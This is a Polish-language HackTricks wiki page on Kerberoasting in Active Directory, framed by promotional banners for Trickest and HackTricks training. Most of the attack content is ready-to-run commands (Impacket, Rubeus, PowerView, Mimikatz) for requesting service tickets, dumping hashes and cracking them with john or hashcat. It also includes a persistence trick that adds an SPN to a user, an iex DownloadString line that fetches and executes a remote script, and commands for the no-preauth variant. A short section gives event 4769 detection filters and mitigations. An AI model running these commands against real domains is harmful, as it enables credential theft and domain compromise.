# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Kerberoast

Kerberoasting koncentruje się na pozyskiwaniu biletów **TGS**, szczególnie tych związanych z usługami działającymi na kontach **użytkowników** w **Active Directory (AD)**, wyłączając konta komputerowe. Szyfrowanie tych biletów wykorzystuje klucze pochodzące z **haseł użytkowników**, co umożliwia **offlineowe łamanie poświadczeń**. Użycie konta użytkownika jako usługi wskazuje na niepusty atrybut **"ServicePrincipalName"**.

Do wykonania **Kerberoastingu** niezbędne jest konto domenowe zdolne do żądania biletów **TGS**, jednak ten proces nie wymaga **specjalnych uprawnień**, co czyni go dostępnym dla każdego posiadającego **ważne poświadczenia domenowe**.

### Kluczowe punkty:
- **Kerberoasting** koncentruje się na biletach **TGS** dla **usług na kontach użytkowników** w **AD**.
- Bilety szyfrowane kluczami pochodzącymi z **haseł użytkowników** mogą być **offlineowo łamane**.
- Usługa jest identyfikowana przez niepusty atrybut **ServicePrincipalName**.
- Nie są wymagane **specjalne uprawnienia**, wystarczą **ważne poświadczenia domenowe**.

### **Atak**

{% hint style="warning" %}
Narzędzia do **Kerberoastingu** zazwyczaj żądają **szyfrowania RC4** podczas wykonywania ataku i inicjowania żądań TGS-REQ. Wynika to z faktu, że **RC4 jest** [**słabszy**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) i łatwiejszy do złamania offline za pomocą narzędzi takich jak Hashcat niż inne algorytmy szyfrowania, takie jak AES-128 i AES-256.\
Hasze RC4 (typ 23) zaczynają się od **`$krb5tgs$23$*`**, podczas gdy AES-256 (typ 18) zaczynają się od **`$krb5tgs$18$*`**.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Wielofunkcyjne narzędzia, w tym wydruk użytkowników podatnych na atak kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Wylicz użytkowników podatnych na atak Kerberoast**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Technika 1: Poproś o TGS i zapisz go z pamięci**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Technika 2: Automatyczne narzędzia**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Podczas żądania TGS generowany jest zdarzenie systemowe Windows `4769 - Żądanie biletu usługi Kerberos`.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Łamanie haseł
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Wytrwałość

Jeśli masz **wystarczające uprawnienia** dla danego użytkownika, możesz go uczynić podatnym na atak kerberoast:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Możesz znaleźć przydatne **narzędzia** do ataków **kerberoast** tutaj: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Jeśli napotkasz ten **błąd** na Linuxie: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Zbyt duża rozbieżność zegara)`**, oznacza to, że twój lokalny czas jest niezsynchronizowany z kontrolerem domeny (DC). Istnieje kilka opcji:

* `ntpdate <IP DC>` - Przestarzałe od Ubuntu 16.04
* `rdate -n <IP DC>`

### Zapobieganie

Atak kerberoast może być przeprowadzany z dużym stopniem skrytości, jeśli jest podatny na atak. Aby wykryć tę aktywność, należy zwrócić uwagę na **ID zdarzenia zabezpieczeń 4769**, które wskazuje na żądanie biletu Kerberos. Jednak ze względu na wysoką częstotliwość tego zdarzenia, należy zastosować konkretne filtry, aby wyodrębnić podejrzane działania:

- Nazwa usługi nie powinna być **krbtgt**, ponieważ jest to normalne żądanie.
- Nazwy usług kończące się na **$** powinny być wykluczone, aby nie uwzględniać kont maszynowych używanych do usług.
- Żądania z maszyn powinny być odfiltrowane przez wykluczenie nazw kont sformatowanych jako **maszyna@domena**.
- Należy uwzględnić tylko udane żądania biletów, które są identyfikowane przez kod błędu **'0x0'**.
- **Najważniejsze**, typ szyfrowania biletu powinien być **0x17**, co często jest wykorzystywane w atakach kerberoast.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Aby zmniejszyć ryzyko związane z Kerberoastingiem:

- Upewnij się, że **Hasła kont usług** są trudne do odgadnięcia, zaleca się długość powyżej **25 znaków**.
- Wykorzystaj **Zarządzane konta usług**, które oferują korzyści takie jak **automatyczne zmiany hasła** i **delegowane zarządzanie nazwą główną usługi (SPN)**, zwiększając bezpieczeństwo przed tego rodzaju atakami.

Wdrożenie tych środków pozwala organizacjom znacznie zmniejszyć ryzyko związane z Kerberoastingiem.


## Kerberoast bez konta domeny

We wrześniu 2022 roku, badacz o nazwie Charlie Clark ujawnił nowy sposób wykorzystania systemu, który został opublikowany na jego platformie [exploit.ph](https://exploit.ph/). Ta metoda umożliwia pozyskanie **Biletów Usług (ST)** za pomocą żądania **KRB_AS_REQ**, które nie wymaga kontroli nad żadnym kontem Active Directory. W zasadzie, jeśli podmiot jest skonfigurowany w taki sposób, że nie wymaga wstępnej autoryzacji - scenariusz podobny do tego, co jest znane w świecie cyberbezpieczeństwa jako atak **AS-REP Roasting** - ta cecha może być wykorzystana do manipulowania procesem żądania. Konkretnie, poprzez zmianę atrybutu **sname** w ciele żądania, system jest wprowadzany w błąd, aby wydał **ST** zamiast standardowego zaszyfrowanego Biletu Granting Ticket (TGT).

Technika ta jest w pełni wyjaśniona w tym artykule: [wpis na blogu Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Musisz podać listę użytkowników, ponieważ nie mamy poprawnego konta do zapytania LDAP przy użyciu tej techniki.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py z PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus z PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Odwołania
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować przepływy pracy** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
